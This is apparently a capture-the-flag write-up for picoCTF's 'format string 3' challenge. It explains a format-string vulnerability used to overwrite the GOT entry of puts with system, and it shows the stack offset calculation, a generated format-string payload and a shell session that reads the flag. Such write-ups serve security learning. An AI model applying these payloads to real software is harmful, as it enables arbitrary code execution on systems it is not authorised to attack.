# format string 3

Format-string Exploit + GOT Overwrite

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/format-string-3/format-string-3_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```

No PIE so the address of the GOT is fixed

Partial RELRO so we can overwrite the GOT with a format string exploit (see https://ir0nstone.gitbook.io/notes/types/stack/relro)

## Core Idea

The core idea is to overwrite the GOT entry of `puts` with the libc function of `system`. The big hint of this is as `puts` is called with the `normal_string` string, which is actually `/bin/sh`. 

We note that `puts` will already have been called before our malicious use of it, so the dynamic linker will not load the libc address of `puts` to overwrite our malicious entry. 

Also, since `puts` is not called after the GOT overwrite and before our intended use, so our overwriting of the GOT is guaranteed not to cause an error before the execution of `system('/bin/sh')`. 

## Offsets

From staring at the assembly, the following buffers are at these addresses relative to the stack frame

```c
rbp-0x410 => buf
rbp-0x510 / rsp => all_strings (array of 32 8-byte char pointers)
```

Notice from [format-string-3.c](./format-string-3.c) that `printf(buf)` is called with one argument. So `%6$p` will start pulling off the stack and leaking null-initialized (and thus not useful) `all_strings` buffer, since that refers to the seventh argument in the variable argument list of `printf`. 

To control the addresses that we write to, we need to specify arguments to be taken from `buf`. Since `buf - flag = 0x100`, we see that the first 8 bits of `buf` is referenced with `%38$p` (since `6 + 0x100//8 = 38`), or can be interpreted as an address to be written to with `%38$n`. 

The offset to be passed into pwntool's FmtStr object is thus 38. 

## Flag

We use pwntools to automate payload generation to obtain the flag (see [solve.py](./solve.py)). 

```bash
[+] Opening connection to rhea.picoctf.net on port 64607: Done
[*] repr(payload)="b'%1888c%46$lln%21c%47$hhn%25c%48$hhn%81c%49$hhn%12c%50$hhnaaaabaa\\x18@@\\x00\\x00\\x00\\x00\\x00\\x1d@@\\x00\\x00\\x00\\x00\\x00\\x1c@@\\x00\\x00\\x00\\x00\\x00\\x1b@@\\x00\\x00\\x00\\x00\\x00\\x1a@@\\x00\\x00\\x00\\x00\\x00'"
[*] Switching to interactive mode

$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_7a2369d3}
```